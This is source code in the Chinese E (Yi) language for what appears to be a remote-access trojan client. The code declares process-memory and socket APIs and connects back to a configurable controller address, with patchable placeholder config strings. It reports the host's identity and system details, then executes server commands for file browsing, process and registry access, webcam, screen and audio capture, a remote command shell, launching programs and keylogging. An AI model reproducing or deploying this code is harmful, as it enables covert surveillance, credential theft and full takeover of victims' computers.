.DLL命令 LoadLibrary, 整数型, "", "LoadLibraryA", 公开, 载入指定的动态链接库，并将它映射到当前进程使用的地址空间。一旦载入，即可访问库内保存的资源
    .参数 lpLibFileName, 文本型, , 指定要载入的动态链接库的名称

.DLL命令 FreeLibrary, 整数型, "", "FreeLibrary", 公开, 
    .参数 DLL句柄, 整数型, , 

.DLL命令 WriteProcessMemory, 整数型, "", "WriteProcessMemory", 公开, 
    .参数 要写进程的句柄, 整数型, , 
    .参数 写内存的起始地址, 整数型, , 
    .参数 写入数据的地址, 整数型, , 
    .参数 要写的字节数, 整数型, , 
    .参数 实际写入的子节数, 整数型, 传址, 

.DLL命令 ReadProcessMemory, 整数型, "", "ReadProcessMemory", 公开, 
    .参数 要读进程的句柄, 整数型, , 
    .参数 读内存的起始地址, 整数型, , 
    .参数 读入数据的地址, 整数型, , 
    .参数 要读入的字节数, 整数型, , 
    .参数 实际读入的子节数, 整数型, , 

.DLL命令 VirtualAllocEx, 整数型, "", "VirtualAllocEx", 公开, 
    .参数 目标进程的句柄, 整数型, , 
    .参数 分配的起始地址, 整数型, , 
    .参数 分配空间的大小, 整数型, , byte
    .参数 分配的类型, 整数型, , 
    .参数 读写的保护模式, 整数型, , 

.DLL命令 GetWindowThreadProcessId, 整数型, "", "GetWindowThreadProcessId", 公开, 
    .参数 xc, 整数型, , 
    .参数 jb, 整数型, 传址, 

.DLL命令 VirtualProtectEx, 整数型, "", "VirtualProtectEx", 公开, 
    .参数 要修改内存的进程句柄, 整数型, , 
    .参数 要修改内存的起始地址, 整数型, , 
    .参数 修改内存的字节, 整数型, , 
    .参数 修改后的内存属性, 整数型, , 
    .参数 修改前的内存属性的地址, 整数型, , 

.DLL命令 ResetEvent, 空白型, "", "ResetEvent", 公开, 
    .参数 a, 整数型, , 

.DLL命令 CreateThread, 整数型, "", "CreateThread", 公开, 句柄
    .参数 安全, 整数型, , 
    .参数 栈大小, 整数型, , 
    .参数 子程序, 子程序指针, , 
    .参数 参数, 整数型, , 
    .参数 标志, 整数型, , 
    .参数 线程ID, 整数型, 传址, 

.DLL命令 WaitForSingleObject, 整数型, "", "WaitForSingleObject", 公开, 
    .参数 a, 整数型, , 
    .参数 b, 整数型, , 

.DLL命令 CloseHandle, 空白型, "", "CloseHandle", 公开, 
    .参数 a, 整数型, , 

.DLL命令 htons, 整数型, "wsock32.dll", "htons", 公开, 把16位的数字从主机字节顺序转换到网络字节顺序
    .参数 主机字节, 整数型, , 

.DLL命令 inet_addr, 整数型, "wsock32.dll", "inet_addr", 公开, 把一个Internet标准的"."记号地址转换成Internet地址数值
    .参数 IP, 文本型, , 

.DLL命令 WSAStartup, 整数型, "wsock32.dll", "WSAStartup", 公开, 
    .参数 版本, 整数型, , 
    .参数 版本信息, 文本型, , 

.DLL命令 send, 整数型, "Ws2_32.dll", "send", 公开, 当调用该函数时，欲发送的数据长度参数（后面简称数据长度）先比较待数据的长度和套接字描述符的发送缓冲区的长度，如果数据长度大于描述符的发送缓冲区的长度，该函数返回-1；如果数据长度小于或者等于描述符的发送缓冲区的长度，那么send先检查协议是否正在发送描述符的发送缓冲中的数据，如果是就等待协议把数据发送完，如果协议还没有开始发送描述符的发送缓冲中的数据或者描述符的发送缓冲中没有数据，那么send就比较描述符的发送缓冲区的剩余空间和数据长度，如果数据长度大于剩余空间大小send就一直等待协议把s的发送缓冲中的数据发送完，如果数据长度小于剩余空间大小send就仅仅把数据缓冲区中的数据复制到剩余空间里（注意并不是send把描述符的发送缓冲中的数据传到连接的另一端的，而是协议传的，send仅仅是把缓冲区中的数据copy到s的发送缓冲区的剩余空间里）。如果send函数复制数据成功，就返回实际复制的字节数，如果send在复制数据时出现错误，那么send就返回-1；如果send在等待协议传送数据时网络断开的话，那么send函数也返回-1。要注意send函数把缓冲中的数据成功复制到描述符的发送缓冲的剩余空间里后它就返回了，但是此时这些数据并不一定马上被传到连接的另一端。如果协议在后续的传送过程中出现网络错误的话，那么下一个Socket函数就会返回-1。（每一个除send外的Socket函数在执行的最开始总要先等待套接字的发送缓冲中的数据被协议传送完毕才能继续，如果在等待时出现网络错误，那么该Socket函数就返回-1）
    .参数 套接字描述符, 整数型, , 
    .参数 欲发送的数据, 字节集, , 
    .参数 欲发送数据的长度, 整数型, , 
    .参数 flags, 整数型, , 一般默认为0

.DLL命令 connect, 整数型, "wsock32.dll", "connect", 公开, 
    .参数 套接字描述符, 整数型, , 
    .参数 地址结构, sokt, , 
    .参数 结构大小, 整数型, , 

.DLL命令 send1, 整数型, "Ws2_32.dll", "send", 公开, 当调用该函数时，欲发送的数据长度参数（后面简称数据长度）先比较待数据的长度和套接字描述符的发送缓冲区的长度，如果数据长度大于描述符的发送缓冲区的长度，该函数返回-1；如果数据长度小于或者等于描述符的发送缓冲区的长度，那么send先检查协议是否正在发送描述符的发送缓冲中的数据，如果是就等待协议把数据发送完，如果协议还没有开始发送描述符的发送缓冲中的数据或者描述符的发送缓冲中没有数据，那么send就比较描述符的发送缓冲区的剩余空间和数据长度，如果数据长度大于剩余空间大小send就一直等待协议把s的发送缓冲中的数据发送完，如果数据长度小于剩余空间大小send就仅仅把数据缓冲区中的数据复制到剩余空间里（注意并不是send把描述符的发送缓冲中的数据传到连接的另一端的，而是协议传的，send仅仅是把缓冲区中的数据copy到s的发送缓冲区的剩余空间里）。如果send函数复制数据成功，就返回实际复制的字节数，如果send在复制数据时出现错误，那么send就返回-1；如果send在等待协议传送数据时网络断开的话，那么send函数也返回-1。要注意send函数把缓冲中的数据成功复制到描述符的发送缓冲的剩余空间里后它就返回了，但是此时这些数据并不一定马上被传到连接的另一端。如果协议在后续的传送过程中出现网络错误的话，那么下一个Socket函数就会返回-1。（每一个除send外的Socket函数在执行的最开始总要先等待套接字的发送缓冲中的数据被协议传送完毕才能继续，如果在等待时出现网络错误，那么该Socket函数就返回-1）
    .参数 套接字描述符, 整数型, , 
    .参数 欲发送的数据, 整数型, , 
    .参数 欲发送数据的长度, 整数型, , 
    .参数 flags, 整数型, , 一般默认为0

.DLL命令 recv, 整数型, "Ws2_32.dll", "recv", 公开, 
    .参数 套接字描述符, 整数型, , 
    .参数 欲接收的数据缓冲, 字节集, , 
    .参数 欲接收数据的长度, 整数型, , 
    .参数 flags, 整数型, , 一般默认为0

.DLL命令 WSACreateEvent, 整数型, "Ws2_32.dll", "WSACreateEvent", 公开, 

.DLL命令 WSAEventSelect, 整数型, "Ws2_32.dll", "WSAEventSelect", 公开, 
    .参数 a, 整数型, , 
    .参数 b, 整数型, , 
    .参数 c, 整数型, , 

.DLL命令 WSAResetEvent, 整数型, "Ws2_32.dll", "WSAResetEvent", 公开, 
    .参数 a, 整数型, , 

.DLL命令 WSACloseEvent, 空白型, "Ws2_32.dll", "WSACloseEvent", 公开, 
    .参数 b, 整数型, , 

.DLL命令 WSAEnumNetworkEvents, 整数型, "Ws2_32.dll", "WSAEnumNetworkEvents", 公开, 
    .参数 s, 整数型, , 
    .参数 jb, 整数型, , 
    .参数 cwdm, 整数型, 传址 数组, 

.DLL命令 closesocket, 整数型, "Ws2_32.dll", "closesocket", 公开, 成功就返回0，否则返回-1
    .参数 套接字描述符, 整数型, , 

.DLL命令 WSASocketA, 整数型, "Ws2_32.dll", "WSASocketA", 公开, 成功就返回新创建的套接字的描述符，如果失败就返回-1
    .参数 协议类型, 整数型, , 2-表示TCP/IP协议
    .参数 套接字类型, 整数型, , 流套接字类型为1；数据报套接字2
    .参数 通信协议, 整数型, , 
    .参数 套接口描述指针, 整数型, , 
    .参数 套接口组描述字, 整数型, , 
    .参数 套接口属性描述, 整数型, , 

.DLL命令 setsockopt, 整数型, "wsock32.dll", "setsockopt", 公开, 
    .参数 套接字描述符, 整数型, , 
    .参数 定义层次, 整数型, , 
    .参数 选项, 整数型, , 
    .参数 选项值缓冲区指针, 整数型, 传址, 
    .参数 缓冲区大小指针, 整数型, 传址, 

.DLL命令 select, 整数型, "wsock32.dll", "select", 公开, 
    .参数 a, 整数型, , 
    .参数 b, 整数型, , 
    .参数 c, 整数型, 传址 数组, 
    .参数 d, 整数型, , 
    .参数 e, 整数型, 传址 数组, 

.程序集 启动程序集, , , 

.子程序 _启动子程序, 整数型, , 本子程序在程序启动后最先执行
未知函数_4140 () ' *** 缩略程序块 ***
 ' 颜色表8位 ＝ { 0, 0, 0, 0, 0, 0, 128, 0, 0, 128, 0, 0, 0, 128, 128, 0, 128, 0, 0, 0, 128, 0, 128, 0, 128, 128, 0, 0, 192, 192, 192, 0, 192, 220, 192, 0, 240, 202, 166, 0, 0, 32, 64, 0, 0, 32, 96, 0, 0, 32, 128, 0, 0, 32, 160, 0, 0, 32, 192, 0, 0, 32, 224, 0, 0, 64, 0, 0, 0, 64, 32, 0, 0, 64, 64, 0, 0, 64, 96, 0, 0, 64, 128, 0, 0, 64, 160, 0, 0, 64, 192, 0, 0, 64, 224, 0, 0, 96, 0, 0, 0, 96, 32, 0, 0, 96, 64, 0, 0, 96, 96, 0, 0, 96, 128, 0, 0, 96, 160, 0, 0, 96, 192, 0, 0, 96, 224, 0, 0, 128, 0, 0, 0, 128, 32, 0, 0, 128, 64, 0, 0, 128, 96, 0, 0, 128, 128, 0, 0, 128, 160, 0, 0, 128, 192, 0, 0, 128, 224, 0, 0, 160, 0, 0, 0, 160, 32, 0, 0, 160, 64, 0, 0, 160, 96, 0, 0, 160, 128, 0, 0, 160, 160, 0, 0, 160, 192, 0, 0, 160, 224, 0, 0, 192, 0, 0, 0, 192, 32, 0, 0, 192, 64, 0, 0, 192, 96, 0, 0, 192, 128, 0, 0, 192, 160, 0, 0, 192, 192, 0, 0, 192, 224, 0, 0, 224, 0, 0, 0, 224, 32, 0, 0, 224, 64, 0, 0, 224, 96, 0, 0, 224, 128, 0, 0, 224, 160, 0, 0, 224, 192, 0, 0, 224, 224, 0, 64, 0, 0, 0, 64, 0, 32, 0, 64, 0, 64, 0, 64, 0, 96, 0, 64, 0, 128, 0, 64, 0, 160, 0, 64, 0, 192, 0, 64, 0, 224, 0, 64, 32, 0, 0, 64, 32, 32, 0, 64, 32, 64, 0, 64, 32, 96, 0, 64, 32, 128, 0, 64, 32, 160, 0, 64, 32, 192, 0, 64, 32, 224, 0, 64, 64, 0, 0, 64, 64, 32, 0, 64, 64, 64, 0, 64, 64, 96, 0, 64, 64, 128, 0, 64, 64, 160, 0, 64, 64, 192, 0, 64, 64, 224, 0, 64, 96, 0, 0, 64, 96, 32, 0, 64, 96, 64, 0, 64, 96, 96, 0, 64, 96, 128, 0, 64, 96, 160, 0, 64, 96, 192, 0, 64, 96, 224, 0, 64, 128, 0, 0, 64, 128, 32, 0, 64, 128, 64, 0, 64, 128, 96, 0, 64, 128, 128, 0, 64, 128, 160, 0, 64, 128, 192, 0, 64, 128, 224, 0, 64, 160, 0, 0, 64, 160, 32, 0, 64, 160, 64, 0, 64, 160, 96, 0, 64, 160, 128, 0, 64, 160, 160, 0, 64, 160, 192, 0, 64, 160, 224, 0, 64, 192, 0, 0, 64, 192, 32, 0, 64, 192, 64, 0, 64, 192, 96, 0, 64, 192, 128, 0, 64, 192, 160, 0, 64, 192, 192, 0, 64, 192, 224, 0, 64, 224, 0, 0, 64, 224, 32, 0, 64, 224, 64, 0, 64, 224, 96, 0, 64, 224, 128, 0, 64, 224, 160, 0, 64, 224, 192, 0, 64, 224, 224, 0, 128, 0, 0, 0, 128, 0, 32, 0, 128, 0, 64, 0, 128, 0, 96, 0, 128, 0, 128, 0, 128, 0, 160, 0, 128, 0, 192, 0, 128, 0, 224, 0, 128, 32, 0, 0, 128, 32, 32, 0, 128, 32, 64, 0, 128, 32, 96, 0, 128, 32, 128, 0, 128, 32, 160, 0, 128, 32, 192, 0, 128, 32, 224, 0, 128, 64, 0, 0, 128, 64, 32, 0, 128, 64, 64, 0, 128, 64, 96, 0, 128, 64, 128, 0, 128, 64, 160, 0, 128, 64, 192, 0, 128, 64, 224, 0, 128, 96, 0, 0, 128, 96, 32, 0, 128, 96, 64, 0, 128, 96, 96, 0, 128, 96, 128, 0, 128, 96, 160, 0, 128, 96, 192, 0, 128, 96, 224, 0, 128, 128, 0, 0, 128, 128, 32, 0, 128, 128, 64, 0, 128, 128, 96, 0, 128, 128, 128, 0, 128, 128, 160, 0, 128, 128, 192, 0, 128, 128, 224, 0, 128, 160, 0, 0, 128, 160, 32, 0, 128, 160, 64, 0, 128, 160, 96, 0, 128, 160, 128, 0, 128, 160, 160, 0, 128, 160, 192, 0, 128, 160, 224, 0, 128, 192, 0, 0, 128, 192, 32, 0, 128, 192, 64, 0, 128, 192, 96, 0, 128, 192, 128, 0, 128, 192, 160, 0, 128, 192, 192, 0, 128, 192, 224, 0, 128, 224, 0, 0, 128, 224, 32, 0, 128, 224, 64, 0, 128, 224, 96, 0, 128, 224, 128, 0, 128, 224, 160, 0, 128, 224, 192, 0, 128, 224, 224, 0, 192, 0, 0, 0, 192, 0, 32, 0, 192, 0, 64, 0, 192, 0, 96, 0, 192, 0, 128, 0, 192, 0, 160, 0, 192, 0, 192, 0, 192, 0, 224, 0, 192, 32, 0, 0, 192, 32, 32, 0, 192, 32, 64, 0, 192, 32, 96, 0, 192, 32, 128, 0, 192, 32, 160, 0, 192, 32, 192, 0, 192, 32, 224, 0, 192, 64, 0, 0, 192, 64, 32, 0, 192, 64, 64, 0, 192, 64, 96, 0, 192, 64, 128, 0, 192, 64, 160, 0, 192, 64, 192, 0, 192, 64, 224, 0, 192, 96, 0, 0, 192, 96, 32, 0, 192, 96, 64, 0, 192, 96, 96, 0, 192, 96, 128, 0, 192, 96, 160, 0, 192, 96, 192, 0, 192, 96, 224, 0, 192, 128, 0, 0, 192, 128, 32, 0, 192, 128, 64, 0, 192, 128, 96, 0, 192, 128, 128, 0, 192, 128, 160, 0, 192, 128, 192, 0, 192, 128, 224, 0, 192, 160, 0, 0, 192, 160, 32, 0, 192, 160, 64, 0, 192, 160, 96, 0, 192, 160, 128, 0, 192, 160, 160, 0, 192, 160, 192, 0, 192, 160, 224, 0, 192, 192, 0, 0, 192, 192, 32, 0, 192, 192, 64, 0, 192, 192, 96, 0, 192, 192, 128, 0, 192, 192, 160, 0, 240, 251, 255, 0, 164, 160, 160, 0, 128, 128, 128, 0, 0, 0, 255, 0, 0, 255, 0, 0, 0, 255, 255, 0, 255, 0, 0, 0, 255, 0, 255, 0, 255, 255, 0, 0, 255, 255, 255, 0 }
 ' 启动线程_ (&视频创建, 0)
 ' 全局_窗口句柄 ＝ 开机启动 ()
初始化 ()
返回 (0) ' 可以根据您的需要返回任意数值

.程序集 TCP核心程序集, , , 

.程序集变量 图标, 文本型, , , 
.程序集变量 分组, 文本型, , , 
.程序集变量 备注信息, 文本型, , , 
.程序集变量 版本, 文本型, , , 
.子程序 初始化, 空白型, , 
创建客户端IOCP线程 ()
 ' 图标 ＝ 删尾空 (“AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA”)
 ' IP端口 ＝ 删尾空 (“BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB”)
 ' 版本 ＝ 删尾空 (“CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC”)
 ' 分组 ＝ 删尾空 (“DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD”)
 ' 备注信息 ＝ 删尾空 (“EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE”)

赋值 (图标, “2”)
赋值 (IP, “127.0.0.1”)
赋值 (端口, 1020)
赋值 (分组, “自动上线主机”)
赋值 (备注信息, “admin”)
赋值 (版本, “V 1.0”)
赋值 (分割符, { 45, 17, 215, 45, 709, 208, 109, 140, 146, 219 }) ' 10位的字节集
输出调试文本 (相加 (“初始化完毕,开始连接....”, #换行符))

赋值 (屏幕裁图许可证, 创建进入许可证_ ())

启动线程_ (&连接子程序) ' 初始化完毕,开始连接
 ' 安装记录钩子 ()
内部_消息循环 ()

.子程序 连接子程序, 空白型, , 
.局部变量 临时文本, 文本型, , , 
.局部变量 临时数组, 文本型, , "0", 

赋值 (连接否, 0)
 ' 临时文本 ＝ IP端口
 ' .如果真 (不等于 (寻找文本 (IP端口, “http://”, , 真), -1))
     ' 临时文本 ＝ 到文本 (http读文件_ (IP端口))
.如果真结束
 ' 临时数组 ＝ 分割文本 (临时文本, “:”, )
 ' .如果真 (不等于 (取数组成员数 (临时数组), 2))
     ' 连接子程序 ()
     ' 返回 ()
.如果真结束
 ' IP ＝ 临时数组 [1]
 ' 端口 ＝ 到整数 (临时数组 [2])

.如果真 (TCP客户端.连接 ( [1], IP, 端口, &网络事件回调函数, 1)) ' 主连接
    赋值 (连接否, 1) ' 已经连接
    上线子程序 ()
    返回 ()
.如果真结束
核心_延时 (5000)
连接子程序 ()

.子程序 上线子程序, 空白型, , 
.局部变量 临时文本, 文本型, , , 

.如果真 (等于 (连接否, 1))
    .如果 (不等于 (查视频驱动 (假), “”))
        赋值 (临时文本, “有”)
    .否则
        赋值 (临时文本, “没”)
    .如果结束
    .如果 (不等于 (本机备注 (), “”))
        赋值 (备注信息, 本机备注 ())
    .否则
        本机备注 (备注信息)
    .如果结束
    传送数据子程序 (1, 相加 ({ 1 }, 到字节集 (分组), 分割符, 到字节集 (图标), 分割符, 到字节集 (系统_取操作系统类别 ()), 分割符, 到字节集 (取计算机名 ()), 分割符, 到字节集 (临时文本), 分割符, 到字节集 (版本), 分割符, 到字节集 (备注信息))) ' 发送上线信息   1=“有视频”
    核心_延时 (10000)
    上线子程序 ()
.如果真结束


.子程序 下线子程序, 空白型, , 
赋值 (连接否, 0)
赋值 (声音, {  })
赋值 (搜索到的文件, “”)
清除数组 (总数据)

启动线程_ (&连接子程序)


.子程序 网络事件回调函数, 空白型, , 
.参数 客户标识, 整数型, , 
.参数 事件类型, 整数型, , 
.参数 数据地址, 整数型, , 
.参数 数据长度, 整数型, , 

.判断开始 (等于 (事件类型, #数据到达))
    包合并_子程序 (客户标识, TCP客户端.取回数据 ( [客户标识], 数据地址, 数据长度))
.判断 (等于 (事件类型, #连接断开))
     ' 状态信息框.方法_加入文本 (到文本 (客户标识) ＋ “   断开了。。。” ＋ #换行符)
     ' 如果真 (客户标识 ＝ 1)
    下线子程序 ()
    
.默认
    
.判断结束


.子程序 包合并_子程序, 空白型, , 头 = { 215, 98, 59, 186, 146, 86 }
.参数 客户标识, 空白型, , 
.参数 到达的数据, 字节集, , 

.局部变量 操作变量, 整数型, , , 
.局部变量 临时数据, 临时总数据类型, , , 
.局部变量 剩余长度, 空白型, , , 取字节集长度 (到达的数据) ＋ 总数据 [操作变量].接收长度
.局部变量 地址正确否, 空白型, , , 0=假 1=真
.局部变量 沾包头处理_临时, 沾包头处理数据类型, , , 
.局部变量 沾包头处理, 沾包头处理数据类型, 静态, "0", 

.如果真 (等于 (取字节集左边 (到达的数据, 6), { 215, 98, 59, 186, 146, 86 }))
    赋值 (临时数据.地址, 客户标识)
    加入成员 (总数据, 临时数据)
    总数据.申请内存大小 ( [取数组成员数 (总数据)].数据, 到整数 (到文本 (取字节集中间 (到达的数据, 7, 13))))
    包合并_子程序 (客户标识, 取字节集右边 (到达的数据, 相减 (取字节集长度 (到达的数据), 19)))
    返回 ()
.如果真结束


.计次循环首 (取数组成员数 (总数据), 操作变量)
    .如果真 (等于 (总数据 [操作变量], 地址, 客户标识))
        赋值 (地址正确否, 1)
        跳出循环 ()
    .如果真结束
    
.计次循环尾 ()

.如果真 (等于 (地址正确否, 0)) ' 包头不完整,开始处理
     ' 输出调试文本 (“开始处理 沾包头 ”)
    .计次循环首 (取数组成员数 (沾包头处理), 操作变量)
        .如果真 (等于 (沾包头处理 [操作变量], 地址, 客户标识))
            包合并_子程序 (客户标识, 相加 (沾包头处理 [操作变量], 字节集, 到达的数据))
            删除成员 (沾包头处理, 操作变量, 1)
            赋值 (地址正确否, 1)
            跳出循环 ()
        .如果真结束
        
    .计次循环尾 ()
    
    .如果真 (等于 (地址正确否, 0))
        输出调试文本 (“地址错误 ”)
    .如果真结束
    
    返回 ()
.如果真结束

.判断开始 (小于 (相加 (取字节集长度 (到达的数据), 总数据.取写到位置 ( [操作变量], 数据)), 总数据.取总尺寸 ( [操作变量], 数据))) ' 还有数据
    总数据.写入字节集 ( [操作变量], 数据, 到达的数据)
.判断 (等于 (相加 (取字节集长度 (到达的数据), 总数据.取写到位置 ( [操作变量], 数据)), 总数据.取总尺寸 ( [操作变量], 数据))) ' 数据完整
    总数据.写入字节集 ( [操作变量], 数据, 到达的数据)
    数据处理_子程序 (客户标识, 总数据.读出全部字节集_并关闭 ( [操作变量], 数据))
    删除成员 (总数据, 操作变量, 1)
.判断 (大于 (相加 (取字节集长度 (到达的数据), 总数据.取写到位置 ( [操作变量], 数据)), 总数据.取总尺寸 ( [操作变量], 数据))) ' 数据有多
    赋值 (剩余长度, 相减 (相加 (取字节集长度 (到达的数据), 总数据.取写到位置 ( [操作变量], 数据)), 总数据.取总尺寸 ( [操作变量], 数据)))
    总数据.写入字节集 ( [操作变量], 数据, 取字节集左边 (到达的数据, 相减 (取字节集长度 (到达的数据), 剩余长度)))
    数据处理_子程序 (客户标识, 总数据.读出全部字节集_并关闭 ( [操作变量], 数据))
    删除成员 (总数据, 操作变量, 1)
    .如果真 (小于 (剩余长度, 20)) ' 包头不完整
        赋值 (沾包头处理_临时.地址, 客户标识)
        赋值 (沾包头处理_临时.字节集, 取字节集右边 (到达的数据, 剩余长度))
        加入成员 (沾包头处理, 沾包头处理_临时)
        输出调试文本 (“沾包  已经给数据保存”)
        返回 ()
    .如果真结束
    包合并_子程序 (客户标识, 取字节集右边 (到达的数据, 剩余长度))
    
.默认
    
.判断结束



.子程序 数据处理_子程序, 空白型, , 
.参数 地址, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 命令, 字节集, , , 

赋值 (命令, 取字节集左边 (数据, 1))
赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 1)))
.判断开始 (等于 (命令, { 1 })) ' 确认已经上线了
    上线_子程序 (数据)
.判断 (等于 (命令, { 2 })) ' 用户详细信息来.
    详细信息子程序 (数据)
.判断 (等于 (命令, { 3 })) ' 有用户发送详细信息来.
    磁盘数据_子程序 ()
.判断 (等于 (命令, { 4 })) ' 文件列表
    文件管理子程序 (数据)
.判断 (等于 (命令, { 5 })) ' 进程信息
    进程信息子程序 (数据)
.判断 (等于 (命令, { 6 })) ' 注册表
    注册表子程序 (数据)
.判断 (等于 (命令, { 7 })) ' 系统服务
    系统服务子程序 (数据)
.判断 (等于 (命令, { 8 })) ' 视频显示
    视频显示子程序 (数据)
.判断 (等于 (命令, { 9 })) ' 屏幕控制
    屏幕控制子程序 (数据)
.判断 (等于 (命令, { 10 })) ' 声音传送
    声音传送子程序 (数据)
.判断 (等于 (命令, { 11 }))
    cmd子程序 (数据)
.判断 (等于 (命令, { 14 }))
    命令广播子程序 (数据)
.判断 (等于 (命令, { 15 }))
    远程程序子程序 (数据)
.判断 (等于 (命令, { 16 }))
    键盘记录子程序 (数据)
.默认
    
.判断结束


 ' 输出调试文本 (“接收完整 地址 = ” ＋ 到文本 (地址) ＋ “    数据长度 = ” ＋ 到文本 (取字节集长度 (数据)))



.子程序 传送数据子程序, 逻辑型, , 
.参数 客户端, 空白型, , 1是主要连接
.参数 数据, 字节集, , 

.局部变量 发送的数据, 字节集, , , 

.如果 (TCP客户端.发送数据 ( [客户端], 相加 ({ 215, 98, 59, 186, 146, 86 }, 到字节集 (取文本右边 (相加 (“0000000000000”, 到文本 (取字节集长度 (数据))), 13)), 数据)))
    返回 (真)
.否则
    返回 (假)
.如果结束



.程序集 功能程序集, , , 

.程序集变量 注册表, 注册表类, , , 
.程序集变量 声音线程, 整数型, , , 
.程序集变量 匿名程序集变量_10853, 空白型, , , 
.程序集变量 屏幕, 屏幕差异获取, , , 
.程序集变量 屏幕宽, 空白型, , , 
.程序集变量 屏幕高, 空白型, , , 
.程序集变量 传送, 逻辑型, , , 
.子程序 上线_子程序, 空白型, , 
.参数 数据, 字节集, , 

赋值 (连接否, 2) ' 代表已经上线了
赋值 (传输端口, 到整数 (到文本 (数据)))
 ' 输出调试文本 (传输端口)

.子程序 详细信息子程序, 空白型, , ‘使用了 应用接口支持库
.参数 数据, 字节集, , 视频。硬盘大小。物理内存。虚拟内存。页面大小。操作系统。当前用户。计算器名。WIN目录。分辨率。控制版本。

.局部变量 计次, 空白型, , , 
.局部变量 驱动器名, 文本型, , "0", 
.局部变量 硬盘总大小, 空白型, , , 
.局部变量 硬盘使用大小, 空白型, , , 
.局部变量 局部_内存状态, 内存状态_, , , 
.局部变量 详细信息, 文本型, , , 
.局部变量 分符, 文本型, , , 
.局部变量 name, 文本型, , , 
.局部变量 tt, 文本型, , , 
.局部变量 秒, 长整数型, , , 
.局部变量 时, 整数型, , , 
.局部变量 分, 整数型, , , 

赋值 (自己的地址, 数据)
 ' 传送数据子程序 (1, { 2 })  ' ＋ 到字节集 (详细信息))
 ' 传送数据子程序 (1, { 3 } ＋ 到字节集 (取磁盘数据 ()))

 ' 返回 ()
赋值 (分符, #换行符)
赋值 (详细信息, 相加 (详细信息, 系统_取操作系统类别 (), 分符))
赋值 (详细信息, 相加 (详细信息, 取系统用户名 (), 分符)) ' 取系统用户名
赋值 (详细信息, 相加 (详细信息, 取计算机名 (), 分符)) ' 取计算机名
.如果 (或者 (等于 (系统_取操作系统类别 (), “Windows NT”), 等于 (系统_取操作系统类别 (), “Windows XP”), 等于 (系统_取操作系统类别 (), “Windows 2000”)))
    赋值 (name, “SOFTWARE\Microsoft\Windows NT\CurrentVersion\”)
    赋值 (tt, “ProcessorNameString”)
.否则
    赋值 (name, “SOFTWARE\Microsoft\Windows\CurrentVersion\”)
    赋值 (tt, “Identifier”)
.如果结束
赋值 (详细信息, 相加 (详细信息, 取文本注册项 (4, 相加 (name, “RegisteredOwner”), “无法读取”), 分符))
赋值 (详细信息, 相加 (详细信息, 取文本注册项 (4, 相加 (name, “ProductId”), “无法读取”), 分符))
 ' 取CPU信息 (cpu)
赋值 (详细信息, 相加 (详细信息, 特殊_CPU取名称 (), 分符)) ' CUP信息
磁盘_取驱动器列表 (驱动器名)
.计次循环首 (取数组成员数 (驱动器名), 计次)
    赋值 (硬盘总大小, 相加 (硬盘总大小, 整除 (磁盘_取总空间 (取文本左边 (驱动器名 [计次], 1)), 1024, 1024)))
    赋值 (硬盘使用大小, 相加 (硬盘使用大小, 整除 (磁盘_取剩余空间 (取文本左边 (驱动器名 [计次], 1)), 1024, 1024)))
.计次循环尾 ()
赋值 (详细信息, 相加 (详细信息, “总:”, 到文本 (硬盘总大小), “GB | 可用:”, 到文本 (硬盘使用大小), “GB”, 分符)) ' 硬盘大小
赋值 (详细信息, 相加 (详细信息, 到文本 (取内存容量信息_ ()), “MB”, 分符)) ' CUP信息
赋值 (详细信息, 相加 (详细信息, 取文本注册项 (4, “SOFTWARE\Microsoft\Internet Explorer\Version”, “未知”), 分符, 取文本注册项 (3, “SOFTWARE\MICROSOFT\INTERNET EXPLORER\MAIN\Start Page”, “未知”), 分符))
 ' 详细信息 ＝ 详细信息 ＋ 到文本 (取启动时间 ()) ＋ 分符

赋值 (秒, 到数值 (到文本 (取启动时间 ())))
.如果真 (大于 (秒, 100))
    赋值 (时, 整除 (秒, 3600000))
    赋值 (分, 整除 (相减 (秒, 相乘 (时, 3600000)), 60000))
    赋值 (详细信息, 相加 (详细信息, 到文本 (时), “小时”, 到文本 (分), “分钟”, 分符))
.如果真结束


赋值 (详细信息, 相加 (详细信息, 取系统特定目录 (0), 分符)) ' 系统目录
赋值 (详细信息, 相加 (详细信息, 取系统特定目录 (1), 分符))
赋值 (详细信息, 相加 (详细信息, 取系统特定目录 (6), 分符))
赋值 (详细信息, 相加 (详细信息, 取系统特定目录 (3), 分符))
赋值 (详细信息, 相加 (详细信息, 取系统特定目录 (9), 分符))
赋值 (详细信息, 相加 (详细信息, 取系统特定目录 (4), 分符))
赋值 (详细信息, 相加 (详细信息, 取系统特定目录 (2), 分符))
赋值 (详细信息, 相加 (详细信息, 取系统特定目录 (7), 分符))








 ' 分符 ＝ #换行符
 ' ' 驱动器名 ＝ 取驱动器列表 (0)

 ' .计次循环首 (取数组成员数 (驱动器名), 计次)
     ' ' 硬盘总大小 ＝ 硬盘总大小 ＋ 取磁盘总空间 (取文本左边 (驱动器名 [计次], 1)) ＼ 1024
     ' ' 硬盘使用大小 ＝ 硬盘使用大小 ＋ 取磁盘剩余空间 (取文本左边 (驱动器名 [计次], 1)) ＼ 1024
 ' .计次循环尾 ()
 ' 详细信息 ＝ “总:” ＋ 到文本 (硬盘总大小) ＋ “MB | 可用:” ＋ 到文本 (硬盘使用大小) ＋ “MB” ＋ 分符  ' 硬盘大小

 ' 详细信息 ＝ 详细信息 ＋ 取CPU信息_ () ＋ 分符  ' CUP信息

